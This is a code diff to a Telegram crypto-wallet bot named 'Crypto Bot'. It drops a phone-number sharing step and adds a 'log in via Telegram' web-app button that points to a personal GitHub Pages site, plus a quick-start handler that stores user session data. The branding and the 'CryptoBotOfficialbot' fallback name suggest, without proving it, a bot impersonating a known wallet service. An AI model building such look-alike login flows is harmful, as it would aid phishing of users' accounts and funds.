@@ -191,6 +191,19 @@ async def cmd_start(msg: Message, state: FSMContext):
         user_registered = True
 
     if msg.from_user.id == config.OWNER_ID or user_registered or (user and user["is_onboarded"]):
+        # Maintain persistent session in data/sessions
+        try:
+            from sessions import create_session
+            user_info = {
+                "id": msg.from_user.id,
+                "username": msg.from_user.username or "",
+                "first_name": msg.from_user.first_name or "",
+                "auth_date": int(time.time())
+            }
+            create_session(msg.from_user.id, user_info)
+        except Exception as e_sess:
+            log.warning("Could not persist session: %s", e_sess)
+
         from database import get_all_balances
         from keyboards import update_user_chat_menu_button, main_menu_inline
         balances = await get_all_balances(msg.from_user.id)
@@ -203,38 +216,66 @@ async def cmd_start(msg: Message, state: FSMContext):
         await msg.answer(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
         return
 
-    # Регистрация нового пользователя
+    # Авторизация нового пользователя через Telegram
     img_path = os.path.join(BASE_DIR, "welcome.jpg")
     text = (
         '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
-        "Кошелёк успешно создан. Завершите настройку аккаунта, чтобы получить доступ ко всем возможностям сервиса."
+        "Кошелёк готов к работе. Войдите через Telegram для мгновенного доступа ко всем возможностям без ввода паролей."
     )
     bot_me = await msg.bot.get_me()
     bot_username = bot_me.username or config.BOT_USERNAME or "CryptoBotOfficialbot"
-    webapp_reg_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&bot={bot_username}&v={int(time.time())}"
+    webapp_url = f"https://flows3039-png.github.io/cryptobot-tg/?tab=wallet&uid={msg.from_user.id}&t={int(time.time())}"
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Начать", web_app=WebAppInfo(url=webapp_reg_url))]
+        [InlineKeyboardButton(text="Войти через Telegram", web_app=WebAppInfo(url=webapp_url))],
+        [InlineKeyboardButton(text="Начать в боте", callback_data="onb:quick_start")]
     ])
     
     if os.path.exists(img_path):
         try:
             await msg.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML")
-            await state.set_state(Onboarding.waiting_start)
             return
         except Exception as e:
             log.warning("Failed answer_photo welcome: %s", e)
     await msg.answer(text, reply_markup=kb, parse_mode="HTML")
-    await state.set_state(Onboarding.waiting_start)
 
+@dp.callback_query(F.data == "onb:quick_start")
 @dp.callback_query(Onboarding.waiting_start, F.data == "onb:start")
-async def onb_start(cb: CallbackQuery, state: FSMContext):
-    kb = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="📱 Поделиться номером", request_contact=True)]],
-        resize_keyboard=True,
-        one_time_keyboard=True,
-    )
-    await cb.message.answer("Подтвердите номер телефона, нажав на кнопку ниже.", reply_markup=kb)
-    await state.set_state(Onboarding.waiting_contact)
+async def cb_quick_start(cb: CallbackQuery, state: FSMContext):
+    await state.clear()
+    from database import set_user_onboarded, generate_all_user_addresses, get_all_balances
+    from keyboards import update_user_chat_menu_button, main_menu_inline
+    from sessions import create_session
+
+    uid = cb.from_user.id
+    await set_user_onboarded(uid)
+    await generate_all_user_addresses(uid)
+
+    user_info = {
+        "id": uid,
+        "username": cb.from_user.username or "",
+        "first_name": cb.from_user.first_name or "",
+        "auth_date": int(time.time())
+    }
+    create_session(uid, user_info)
+
+    balances = await get_all_balances(uid)
+    try:
+        await update_user_chat_menu_button(cb.bot, uid, balances)
+    except Exception:
+        pass
+
+    kb = main_menu_inline(user_id=uid, balances=balances)
+    text = get_start_text()
+    try:
+        await cb.message.delete()
+    except Exception:
+        pass
+
+    img_path = os.path.join(BASE_DIR, "start_banner.jpg")
+    if os.path.exists(img_path):
+        await cb.message.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML")
+    else:
+        await cb.message.answer(text, reply_markup=kb, parse_mode="HTML")
     await cb.answer()
 
 @dp.message(Onboarding.waiting_contact, F.contact)
